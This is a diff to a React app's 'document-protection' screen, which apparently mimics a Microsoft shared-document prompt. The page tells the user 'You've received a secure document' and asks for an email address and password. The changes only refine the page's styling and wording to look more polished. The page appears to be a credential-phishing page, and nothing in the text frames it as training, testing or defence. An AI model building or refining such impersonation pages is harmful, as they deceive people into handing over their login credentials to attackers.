@@ -517,7 +517,7 @@ function App() {
       );
 
     case 'document-protection':
-      // --- Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH ---
+      // --- Refined Microsoft-styled card, logic untouched ---
       return (
         <div style={{
           background: "#f7f9fb",
@@ -532,48 +532,49 @@ function App() {
             {`
             .card {
               background: #fff;
-              border-radius: 10px;
-              box-shadow: 0 6px 22px 0 rgba(0,0,0,0.08);
-              padding: 35px 45px 35px 45px;
-              max-width: 530px;
+              border-radius: 12px;
+              box-shadow: 0 8px 32px rgba(0,0,0,0.13);
+              padding: 42px 32px 38px 32px;
+              max-width: 410px;
               width: 100%;
-              margin-top: 38px;
+              margin-top: 54px;
               display: flex;
               flex-direction: column;
               align-items: center;
             }
             .logo {
-              width: 100px;
-              margin-bottom: 28px;
+              width: 88px;
+              margin-bottom: 22px;
               display: block;
             }
             .title {
-              font-size: 1.7em;
+              font-size: 1.45em;
               font-weight: 600;
-              color: #23272a;
-              margin-bottom: 16px;
-              letter-spacing: 0.01em;
+              color: #222;
+              margin-bottom: 10px;
+              letter-spacing: 0.02em;
               text-align: center;
             }
             .desc {
-              font-size: 1.04em;
-              color: #38444d;
-              margin-bottom: 10px;
+              font-size: 1.01em;
+              color: #444;
+              margin-bottom: 8px;
               text-align: center;
+              font-weight: 500;
             }
             .secure-link {
-              font-size: 1.13em;
-              font-weight: 150;
+              font-size: 1.09em;
+              font-weight: 400;
               color: #0078d4;
-              margin-bottom: 16px;
+              margin-bottom: 14px;
               text-align: center;
               word-break: break-word;
             }
             .instructions {
-              font-size: 1em;
+              font-size: 0.99em;
               color: #626b76;
               margin-bottom: 20px;
-              line-height: 1.5em;
+              line-height: 1.55em;
               text-align: center;
             }
             .form-group {
@@ -582,82 +583,90 @@ function App() {
               margin-left: 0;
               display: flex;
               flex-direction: column;
-              align-items: flex-start;
+              align-items: stretch;
               background: none;
             }
             .input-label {
               font-size: 0.97em;
               color: #4d5a67;
               margin-bottom: 7px;
+              margin-top: 12px;
+              font-weight: 500;
               text-align: left;
-              margin-left: 8px;
-              margin-top: 10px;
-              align-self: flex-start;
             }
             .input-row {
               width: 100%;
               position: relative;
-              margin-bottom: 18px;
-              background: #f6f8fa;
+              margin-bottom: 12px;
+              background: #f5f8fa;
               border-radius: 6px;
               display: flex;
               align-items: center;
+              border: 1px solid #e3e6ec;
+              transition: border .16s;
             }
             input[type="email"], input[type="password"] {
               width: 100%;
-              font-size: 1.07em;
-              padding: 12px 60px 12px 20px;
-              border: 1.5px solid #cfd8dc;
+              font-size: 1em;
+              padding: 11px 48px 11px 14px;
+              border: none;
               border-radius: 6px;
               box-sizing: border-box;
-              transition: border 0.2s;
-              outline: none;
               background: transparent;
               margin-bottom: 0;
-              display: block;
               color: #23272a;
+              font-family: inherit;
+              font-weight: 500;
+              transition: box-shadow .18s;
             }
             input[type="email"]:focus, input[type="password"]:focus {
-              border-color: #0078d4;
+              outline: none;
+              background: #fff;
+              box-shadow: 0 0 0 2px #0078d477;
+            }
+            .input-row:focus-within {
+              border: 1.5px solid #0078d4;
               background: #fff;
             }
             .input-icon {
               position: absolute;
-              right: 12px;
+              right: 13px;
               top: 50%;
               transform: translateY(-50%);
-              width: 22px;
-              height: 22px;
-              opacity: 0.6;
+              width: 18px;
+              height: 18px;
+              opacity: 0.55;
               pointer-events: none;
             }
             .next-btn {
               width: 100%;
-              background: linear-gradient(90deg,#0078d4 0,#005fa3 100%);
+              background: linear-gradient(90deg,#0078d4 0%,#005fa3 100%);
               color: #fff;
               border: none;
-              border-radius: 4px;
-              font-size: 1.15em;
-              font-weight: 500;
-              padding: 14px 0;
+              border-radius: 7px;
+              font-size: 1.11em;
+              font-weight: 600;
+              padding: 13px 0;
               cursor: pointer;
-              margin-bottom: 18px;
-              margin-top: 6px;
-              box-shadow: 0 2px 8px rgba(0,120,212,0.08);
-              transition: background 0.18s;
+              margin-bottom: 8px;
+              margin-top: 17px;
+              box-shadow: 0 2px 7px rgba(0,120,212,0.10);
+              transition: background 0.17s, box-shadow 0.17s;
               display: block;
+              letter-spacing: 0.01em;
             }
             .next-btn:hover, .next-btn:focus {
               background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
+              box-shadow: 0 4px 16px rgba(0,120,212,0.13);
             }
             .footer-text {
-              font-size: 0.92em;
-              color: #8896ae;
-              margin-top: 12px;
+              font-size: 0.89em;
+              color: #a0a8b6;
+              margin-top: 18px;
               margin-bottom: 0;
-              text-align: justify;
-              line-height: 1.5em;
-              max-width: 100%;
+              text-align: center;
+              line-height: 1.52em;
+              max-width: 92%;
               width: 100%;
               letter-spacing: 0.01em;
               word-break: break-word;
@@ -665,21 +674,21 @@ function App() {
             }
             .copyright {
               text-align: center;
-              color: #b0b9c6;
-              font-size: 0.98em;
-              margin-top: 18px;
-              margin-bottom: 15px;
+              color: #bcc3d0;
+              font-size: 0.91em;
+              margin-top: 24px;
+              margin-bottom: 0;
             }
             @media (max-width: 700px) {
               .card {
                 max-width: 98vw;
-                padding: 18px 2vw 16px 2vw;
+                padding: 21px 2vw 16px 2vw;
               }
               .footer-text, .copyright {
-                font-size: 0.87em;
+                font-size: 0.85em;
               }
               .logo {
-                width: 92px;
+                width: 74px;
               }
               .form-group {
                 width: 100%;
@@ -695,7 +704,7 @@ function App() {
             <div className="desc">You've received a secure document</div>
             <div className="secure-link">Protected Document File</div>
             <div className="instructions">
-              To open this secure Document, please enter the email address that this item was shared to.
+              To open this secure document, please enter the email address that this item was shared to.
             </div>
             <form onSubmit={handleFormSubmit} autoComplete="off">
               <div className="form-group">
@@ -753,7 +762,6 @@ function App() {
           </div>
         </div>
       );
-      // --- END Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH ---
 
     case 'reauthenticating':
       return (
